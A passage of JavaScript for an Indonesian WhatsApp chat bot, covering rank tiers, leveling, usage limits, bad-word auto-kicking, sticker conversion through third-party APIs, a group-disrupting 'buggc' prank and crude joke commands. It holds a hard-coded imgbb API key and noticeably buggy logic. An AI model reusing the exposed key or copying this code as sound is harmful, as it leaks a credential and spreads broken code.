        } else if (levelRole <= 6) {
            role = 'Beginner Grade 2 ⚊²'
        } else if (levelRole <= 8) {
            role = 'Beginner Grade 3 ⚊³'
        } else if (levelRole <= 10) {
            role = 'Beginner Grade 4 ⚊⁴'
        } else if (levelRole <= 12) {
            role = 'Private Grade 1 ⚌¹'
        } else if (levelRole <= 14) {
            role = 'Private Grade 2 ⚌²'
        } else if (levelRole <= 16) {
            role = 'Private Grade 3 ⚌³'
        } else if (levelRole <= 18) {
            role = 'Private Grade 4 ⚌⁴'
        } else if (levelRole <= 20) {
            role = 'Private Grade 5 ⚌⁵'
        } else if (levelRole <= 22) {
            role = 'Corporal Grade 1 ☰¹'
        } else if (levelRole <= 24) {
            role = 'Corporal Grade 2 ☰²'
        } else if (levelRole <= 26) {
            role = 'Corporal Grade 3 ☰³'
        } else if (levelRole <= 28) {
            role = 'Corporal Grade 4 ☰⁴'
        } else if (levelRole <= 30) {
            role = 'Corporal Grade 5 ☰⁵'
        } else if (levelRole <= 32) {
            role = 'Sergeant Grade 1 ≣¹'
        } else if (levelRole <= 34) {
            role = 'Sergeant Grade 2 ≣²'
        } else if (levelRole <= 36) {
            role = 'Sergeant Grade 3 ≣³'
        } else if (levelRole <= 38) {
            role = 'Sergeant Grade 4 ≣⁴'
        } else if (levelRole <= 40) {
            role = 'Sergeant Grade 5 ≣⁵'
        } else if (levelRole <= 42) {
            role = 'Staff Grade 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Staff Grade 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Staff Grade 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Staff Grade 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Staff Grade 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Sergeant Grade 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Sergeant Grade 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Sergeant Grade 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Sergeant Grade 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Sergeant Grade 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = '2nd Lt. Grade 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = '2nd Lt. Grade 2 ♢²'
        } else if (levelRole <= 66) {
            role = '2nd Lt. Grade 3 ♢³'
        } else if (levelRole <= 68) {
            role = '2nd Lt. Grade 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = '2nd Lt. Grade 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = '1st Lt. Grade 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = '1st Lt. Grade 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = '1st Lt. Grade 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = '1st Lt. Grade 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = '1st Lt. Grade 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Major Grade 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Major Grade 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Major Grade 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Major Grade 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Major Grade 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Colonel Grade 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Colonel Grade 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Colonel Grade 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Colonel Grade 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Colonel Grade 5 ✷✷⁵'
        } else if (levelRole <= 102) {
            role = 'Brigadier Early ✰'
        } else if (levelRole <= 104) {
            role = 'Brigadier Silver ✩'
        } else if (levelRole <= 106) {
            role = 'Brigadier gold ✯'
        } else if (levelRole <= 108) {
            role = 'Brigadier Platinum ✬'
        } else if (levelRole <= 110) {
            role = 'Brigadier Diamond ✪'
        } else if (levelRole <= 112) {
            role = 'Major General Early ✰'
        } else if (levelRole <= 114) {
            role = 'Major General Silver ✩'
        } else if (levelRole <= 116) {
            role = 'Major General gold ✯'
        } else if (levelRole <= 118) {
            role = 'Major General Platinum ✬'
        } else if (levelRole <= 120) {
            role = 'Major General Diamond ✪'
        } else if (levelRole <= 122) {
            role = 'Lt. General Early ✰'
        } else if (levelRole <= 124) {
            role = 'Lt. General Silver ✩'
        } else if (levelRole <= 126) {
            role = 'Lt. General gold ✯'
        } else if (levelRole <= 128) {
            role = 'Lt. General Platinum ✬'
        } else if (levelRole <= 130) {
            role = 'Lt. General Diamond ✪'
        } else if (levelRole <= 132) {
            role = 'General Early ✰'
        } else if (levelRole <= 134) {
            role = 'General Silver ✩'
        } else if (levelRole <= 136) {
            role = 'General gold ✯'
        } else if (levelRole <= 138) {
            role = 'General Platinum ✬'
        } else if (levelRole <= 140) {
            role = 'General Diamond ✪'
        } else if (levelRole <= 142) {
            role = 'Commander Early ★'
        } else if (levelRole <= 144) {
            role = 'Commander Intermediate ⍣'
        } else if (levelRole <= 146) {
            role = 'Commander Elite ≛'
        } else if (levelRole <= 148) {
            role = 'The Commander Hero ⍟'
        } else if (levelRole <= 152) {
            role = 'Legends 忍'
        } else if (levelRole <= 154) {
            role = 'Legends 忍'
        } else if (levelRole <= 156) {
            role = 'Legends 忍'
        } else if (levelRole <= 158) {
            role = 'Legends 忍'
        } else if (levelRole <= 160) {
            role = 'Legends 忍'
        } else if (levelRole <= 162) {
            role = 'Legends 忍'
        } else if (levelRole <= 164) {
            role = 'Legends 忍'
        } else if (levelRole <= 166) {
            role = 'Legends 忍'
        } else if (levelRole <= 168) {
            role = 'Legends 忍'
        } else if (levelRole <= 170) {
            role = 'Legends 忍'
        } else if (levelRole <= 172) {
            role = 'Legends 忍'
        } else if (levelRole <= 174) {
            role = 'Legends 忍'
        } else if (levelRole <= 176) {
            role = 'Legends 忍'
        } else if (levelRole <= 178) {
            role = 'Legends 忍'
        } else if (levelRole <= 180) {
            role = 'Legends 忍'
        } else if (levelRole <= 182) {
            role = 'Legends 忍'
        } else if (levelRole <= 184) {
            role = 'Legends 忍'
        } else if (levelRole <= 186) {
            role = 'Legends 忍'
        } else if (levelRole <= 188) {
            role = 'Legends 忍'
        } else if (levelRole <= 190) {
            role = 'Legends 忍'
        } else if (levelRole <= 192) {
            role = 'Legends 忍'
        } else if (levelRole <= 194) {
            role = 'Legends 忍'
        } else if (levelRole <= 196) {
            role = 'Legends 忍'
        } else if (levelRole <= 198) {
            role = 'Legends 忍'
        } else if (levelRole <= 200) {
            role = 'Legends 忍'
        } else if (levelRole <= 210) {
            role = 'Legends 忍'
        } else if (levelRole <= 220) {
            role = 'Legends 忍'
        } else if (levelRole <= 230) {
            role = 'Legends 忍'
        } else if (levelRole <= 240) {
            role = 'Legends 忍'
        } else if (levelRole <= 250) {
            role = 'Legends 忍'
        } else if (levelRole <= 260) {
            role = 'Legends 忍'
        } else if (levelRole <= 270) {
            role = 'Legends 忍'
        } else if (levelRole <= 280) {
            role = 'Legends 忍'
        } else if (levelRole <= 290) {
            role = 'Legends 忍'
        } else if (levelRole <= 300) {
            role = 'Legends 忍'
        } else if (levelRole <= 310) {
            role = 'Legends 忍'
        } else if (levelRole <= 320) {
            role = 'Legends 忍'
        } else if (levelRole <= 330) {
            role = 'Legends 忍'
        } else if (levelRole <= 340) {
            role = 'Legends 忍'
        } else if (levelRole <= 350) {
            role = 'Legends 忍'
        } else if (levelRole <= 360) {
            role = 'Legends 忍'
        } else if (levelRole <= 370) {
            role = 'Legends 忍'
        } else if (levelRole <= 380) {
            role = 'Legends 忍'
        } else if (levelRole <= 390) {
            role = 'Legends 忍'
        } else if (levelRole <= 400) {
            role = 'Legends 忍'
        } else if (levelRole <= 410) {
            role = 'Legends 忍'
        } else if (levelRole <= 420) {
            role = 'Legends 忍'
        } else if (levelRole <= 430) {
            role = 'Legends 忍'
        } else if (levelRole <= 440) {
            role = 'Legends 忍'
        } else if (levelRole <= 450) {
            role = 'Legends 忍'
        } else if (levelRole <= 460) {
            role = 'Legends 忍'
        } else if (levelRole <= 470) {
            role = 'Legends 忍'
        } else if (levelRole <= 480) {
            role = 'Legends 忍'
        } else if (levelRole <= 490) {
            role = 'Legends 忍'
        } else if (levelRole <= 500) {
            role = 'Legends 忍'
        } else if (levelRole <= 600) {
            role = 'Legends 忍'
        } else if (levelRole <= 700) {
            role = 'Legends 忍'
        } else if (levelRole <= 800) {
            role = 'Legends 忍'
        } else if (levelRole <= 900) {
            role = 'Legends 忍'
        } else if (levelRole <= 1000) {
            role = 'Legends 忍'
        } else if (levelRole <= 2000) {
            role = 'Legends 忍'
        } else if (levelRole <= 3000) {
            role = 'Legends 忍'
        } else if (levelRole <= 4000) {
            role = 'Legends 忍'
        } else if (levelRole <= 5000) {
            role = 'Legends 忍'
        } else if (levelRole <= 6000) {
            role = 'Legends 忍'
        } else if (levelRole <= 7000) {
            role = 'Legends 忍'
        } else if (levelRole <= 8000) {
            role = 'Legends 忍'
        } else if (levelRole <= 9000) {
            role = 'Legends 忍'
        } else if (levelRole <= 10000) {
            role = 'Legends 忍'

           var prema = 'Free'
			if (!isAdmin) {
				prema = 'Adminban'
			}
			if (!isPremium) {
				prema = 'Premium'
			} 
			if (!isOwner) {
				prema = 'Owner'
			}
	}
			//funtion nobadword
			if (isGroup && isBadWord) {
            if (bad.includes(messagesC)) {
                if (!isGroupAdmins) {
                    return reply("JAGA UCAPAN DONG!! 😠")
                        .then(() => Angga.groupRemove(from, sender))
                        .then(() => {
                            Angga.sendMessage(from, `*「 ANTI BADWORD 」*\n akan kick kamu karena berkata kasar!`, text ,{quoted: mek})
                        }).catch(() => Angga.sendMessage(from, `Untung cya bukan admin, kalo admin udah cya kick!`, text , {quoted : mek}))
                } else {
                    return reply( "Tolong Jaga Ucapan Min 😇")
                }
            }
        }
			
	        //function leveling
            if (isGroup && isRegistered && isLevelingOn) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 100
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    bayarLimit(sender, 3)
                    await reply(ind.levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
          //function check limit
          const checkLimit = (sender) => {
          	let found = false
                    for (let lmt of _limit) {
                        if (lmt.id === sender) {
                            let limitCounts = limitawal - lmt.limit
                            if (limitCounts <= 0) return Angga.sendMessage(from,`Limit request anda sudah habis\n\n_Note : limit bisa di dapatkan dengan cara ${prefix}buylimit dan dengan naik level_`, text,{ quoted: mek})
                            Angga.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                            found = true
                        }
                    }
                    if (found === false) {
                        let obj = { id: sender, limit: 0 }
                        _limit.push(obj)
                        fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
                        Angga.sendMessage(from, ind.limitcount(limitCounts), text, { quoted : mek})
                    }
				}
			
		for (let x of mentionUser) {
                if (afk.hasOwnProperty(x.split('@')[0])) {
                    ini_txt = "Maaf user yang anda reply atau tag sedang afk. "
                    if (afk[x.split('@')[0]] != "") {
                        ini_txt += "Dengan alasan " + afk[x.split('@')[0]]
                    }
                    reply(ini_txt)
                }
            }
            if (afk.hasOwnProperty(sender.split('@')[0])) {
                reply("Anda telah keluar dari mode afk.")
                delete afk[sender.split('@')[0]]
                fs.writeFileSync("./database/afk.json", JSON.stringify(afk))
            }
			
			//funtion limited
           const isLimit = (sender) =>{ 
		      let position = false
              for (let i of _limit) {
              if (i.id === sender) {
              	let limits = i.limit
              if (limits >= limitawal ) {
              	  position = true
                    Angga.sendMessage(from, ind.limitend(pushname), text, {quoted: mek})
                    return true
              } else {
              	_limit
                  position = true
                  return false
               }
             }
           }
           if (position === false) {
           	const obj = { id: sender, limit: 0 }
                _limit.push(obj)
                fs.writeFileSync('./database/pengguna/limit.json',JSON.stringify(_limit))
           return false
       }
     }

        
            if (isGroup) {
				try {
					const getmemex = groupMembers.length
					    if (getmemex <= memberlimit) {
					    }
		       } catch (err) { console.error(err)  }
        }
      
      // Tebak Gambar
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                kuis = true
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply("Jawaban Anda Benar!")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply("Jawaban Anda Salah!")
                }
            }
    
        //function balance
            if (isRegistered ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }

             //kolor
			colors = ['red','white','black','blue','yellow','green']
			
			//detector media
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			
			//private chat message
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			
			//group message
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			
			switch(command) {
				case 'nobadword': 
                    if (!isGroup) return reply(ind.groupo())
                if (!isGroupAdmins) return reply(ind.admin())
                if (args.length < 1) return reply('1 untuk menyalakan, 0 untuk mematikan')
                if (args[0] === '1') {
                if (isBadWord) return reply('*Fitur BadWord sudah aktif sebelum nya*')
                 	   badword.push(from)
                 	   fs.writeFileSync('./database/kelompok/badword.json', JSON.stringify(badword))
                  	   reply(`Fitur Badword Enable!`)
              	  } else if (args[0] === '0') {
                  	  badword.splice(from, 1)
                 	   fs.writeFileSync('./database/kelompok/badword.json', JSON.stringify(badword))
                 	    reply(`Fitur Badword Disable`)
             	   } else {
                 	   reply(ind.satukos())
                	}
                    break
		case 'buggc':
await Angga.toggleDisappearingMessages(from)
reply("yahaha")
break
		case 'sewabot1':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const teksnya = `*[ BELI ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Bang Saya Mau Beli Scnya`
                      var options = {
                         text: teksnya,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membeli Script!, tunggu owner script menchat anda!.\nUntuk Membatalkan Pesanan Ketik zbatal1')
                    break
		case 'batal1':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const batal1 = `*[ BATAL ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Saya Tidak Menjadi Beli Scriptnya`
                      var options = {
                         text: batal1,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membatalkan Pesanan!.')
                    break
                    case 'batal2':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const batal2 = `*[ BATAL ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Saya Tidak Menjadi Beli Scriptnya`
                      var options = {
                         text: batal2,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membatalkan Pesanan!.')
                    break
                    case 'batal3':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const batal3 = `*[ BATAL ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Saya Tidak Menjadi Beli Scriptnya`
                      var options = {
                         text: batal3,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membatalkan Pesanan!.')
                    break
                    case 'batal4':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const batal4 = `*[ BATAL ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Saya Tidak Menjadi Beli Scriptnya`
                      var options = {
                         text: batal4,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membatalkan Pesanan!.')
                    break
		case 'sewabot2':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const teksnya2 = `*[ BELI ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Bang Saya Mau Beli Scnya`
                      var options = {
                         text: teksnya2,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membeli Script!, tunggu owner script menchat anda!.\n Untuk Membatalkan Pesanan Ketik zbatal2')
                    break
                    case 'sewabot3':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const teksnya4 = `*[ BELI ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Bang Saya Mau Beli Scnya`
                      var options = {
                         text: teksnya4,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membeli Script!, tunggu owner script menchat anda!.\nUntuk Membatalkan Pesanan Ketik zbatal3')
                    break
                    case 'sewabot4':
				if (isBanned) return reply(ind.baned())
                if (!isRegistered) return reply(ind.noregis())
                      nomorsewa = `${sender.split("@")[0]}@s.whatsapp.net`
                       const teksnya3 = `*[ BELI ]*\nNomor : @${nomorsewa.split('@')[0]}\nPesan : Bang Saya Mau Beli Scnya`
                      var options = {
                         text: teksnya3,
                         contextInfo: {mentionedJid: [nomorsewa]},
                     }
                    Angga.sendMessage('6285283427860@s.whatsapp.net', options, text, {quoted: mek})
                    reply('Anda Telah Membeli Script!, tunggu owner script menchat anda!.\nUntuk Membatalkan Pesanan Ketik zbatal4')
                    break
		case'daftarsewa':
sewa = fs.readFileSync('sewa.jpg')
ow = "6285283427860@s.whatsapp.net"
daftarnye = `
@----------DAFTAR SEWA----------@
CARA: KETIK 1 SAMPAI 4 UNTUK MEMILIH

+(1).AnggaGanzz
-tag: @${ow.split('@')[0]}

-NOTE
Pilih Salah Satu Diatas Untuk Membeli
Script Bot Langka!
Contoh:
${prefix}sewa1
----------------------------------------------------`
Angga.sendMessage(from, sewa, image, {quoted: mek2, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [ow, ow2, ow3, ow4]}, displayname: mem, caption: daftarnye })
break
		case 'mute':
                Angga.modifyChat(from, ChatModification.mute, 24*60*60*1000)
                reply('*succes mute this chat*')
                console.log('succes mute chat = ' + from)
                break
            case 'unmute':
                Angga.modifyChat(from, ChatModification.unmute)
                reply('*succes unmute this chat*')
                console.log('succes unmute chat = ' + from)
                break
		case 'tovideo':
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".gif")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/togif?apikey=${LolKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Angga.sendMessage(from, ini_buff, video, { quoted: freply, mimetype: "video/gif", filename: file_name }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
		case 'colong':
                    if ((isMedia && !Angga.message.videoMessage || isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        filePath = await Angga.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        request({
                            url: `http://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${LolKey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": 'Yahaha Kena Comlong',
                                "author": 'By AnggaGanzz'
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            Angga.sendMessage(from, ini_buff, sticker, { quoted: mek })
                            fs.unlinkSync(file_name)
                        });
                    } else {
                        reply(`Kirim stiker dengan caption ${prefix + command} atau tag sticker yang sudah dikirim`)
                    }
                    break
		case 'chat':
				if (args.length < 1) return reply('Apa pesan nya?')
					var kntl = body.slice(6)
					var ajk = kntl.split("|")[0];
					var chatnya = kntl.split("|")[1];
					Angga.sendMessage(from, `${ajk}@s.whatsapp.net`, `Dari wa.me/${sender.replace('@s.whatsapp.net', '')}\nKatanya: ${chatnya}`)
					break
	       case 'join':
setTimeout( () => {
Angga.query({json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]})
suksez = `Sukses Gabung Ke Grup!`
Angga.sendMessage(from, suksez, text,{quoted : mek, contextInfo: { forwardingScore: 100, isForwarded: true}})
}, 20000) // 1000 = 1s,
setTimeout( () => {
reply('Oke Desu~')
}, 0) // 1000 = 1s,
break
case 'circle':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply("Wait Bro Comli Dlu:V")
  owgi = await Angga.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("e4d134a6d42adba8cb87d8db741b58c2", owgi)
  hedhe = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebpwround?apikey=${LoLKey}&img=${anu.display_url}`)
 Angga.sendMessage(from, hedhe, sticker, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
} else {
  reply('Heduh Si anjg')
}
break
					case 'setlol':
					if (!isRegistered) return reply(ind.noregis())
					if (!isOwner) return reply(ind.ownerb())
					LoLKey = args.join(" ")
					reply(`LoLKey berhasil di ubah menjadi : ${LoLKey}`)
					break 
					case 'settobz':
					if (!isRegistered) return reply(ind.noregis())
					if (!isOwner) return reply(ind.ownerb())
					TobzKey = args.join(" ")
					reply(`TobzKey berhasil di ubah menjadi : ${TobzKey}`)
					break 
					case 'setxteam':
					if (!isRegistered) return reply(ind.noregis())
					if (!isOwner) return reply(ind.ownerb())
					XteamKey = args.join(" ")
					reply(`XteamKey berhasil di ubah menjadi : ${XteamKey}`)
					break 
				case 'setwmsticker':
					if (!isRegistered) return reply(ind.noregis())
					if (!isOwner) return reply(ind.ownerb())
					ini_nama = args.join(" ").split("&")
					namo = ini_nama[0].trim()
					ator = ini_nama[1].trim()
					reply(`Namo Dan Ator berhasil di ubah`)
					break 
				case 'fuckboy':
				case 'fuckgirl':
				case 'bucinserti':
				case 'pacarserti':
				case 'goodboy':
				case 'goodgirl':
				case 'badboy':
				case 'badgirl':
				query = args.join(" ")
				cap = `Nama: ${query}`
				riu = await getBuffer(`http://lolhuman.herokuapp.com/api/${command}?apikey=${LoLKey}&name=${query}`)
				Angga.sendMessage(from, riu, image, {quoted: mek, contextInfo: { forwardingScore: 1, isForwarded: true}, caption: cap})
				break
		case 'tebakgokil':
                if (!isRegistered) return reply(ind.noregis())
		if (isLimit(sender)) return reply(ind.limitend(pusname))
		if (!isGroup) return reply(ind.groupo())
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/jenaka?apikey=${LoLKey}`, {method: 'get'})
					jenak = `*${anu.result.question}*`
					setTimeout( () => {
					Angga.sendMessage(from, '*➸ Jawaban :* '+anu.result.answer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, jenak, text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break 
		case 'tebakgokil2':
                if (!isRegistered) return reply(ind.noregis())
		if (isLimit(sender)) return reply(ind.limitend(pusname))
		if (!isGroup) return reply(ind.groupo())
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/siapaaku?apikey=${LoLKey}`, {method: 'get'})
					siapariu = `*${anu.result.question}*`
					setTimeout( () => {
					Angga.sendMessage(from, '*➸ Jawaban :* '+anu.result.answer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Angga.sendMessage(from, siapariu, text, {quoted: mek }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break
					case 'gantengcek':
                    N = `KE *GANTENGAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😎`
                    reply(N)
                    break 
                    case 'cantikcek':
                    N = `KE *CANTIKAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}% 😁*`
                    reply(N)
                    break
                    case 'jelekcek':
                    N = `KE *J3L3K4N* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🤢`
                    reply(N)
                    break 
                    case 'goblokcek':
                    N = `KE *GOBLOKAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🤣`
                    reply(N)
                    break 
                    case 'begocek':
                    N = `KE *BEGO* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😂`
                    reply(N)
                    break 
                    case 'pintercek': 
                    N = `KE *PINTARAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😗`
                    reply(N)
                    break 
                    case 'jagocek': 
                    N = `KE *JAGOAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 💪`
                    reply(N)
                    break 
                    case 'nolepcek': 
                    N = `KE *NOLEPAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🧐`
                    reply(N)
                    break 
                    case 'babicek': 
                    N = `KE *BABIAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🤪`
                    reply(N)
                    break 
                    case 'bebancek':
                    N = `KE *BEBANAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🤬`
                    reply(N)
                    break 
                    case 'baikcek': 
                    N = `KE *BAIKAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😇`
                    reply(N)
                    break 
                    case 'jahatcek': 
                    N = `KE *JAHATAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 😈`
                    reply(N)
                    break 
                    case 'anjingcek': 
                    N = `KE *ANJINGAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 👀`
                    reply(N)
                    break                      
                    case 'haramcek':
                    N = `KE *HARAMAN* KAMU\n`
                    N += `ADALAH : *${angga3}${angga4}%* 🥴`
                    reply(N)
                    break  
                    case 'kontolcek': 
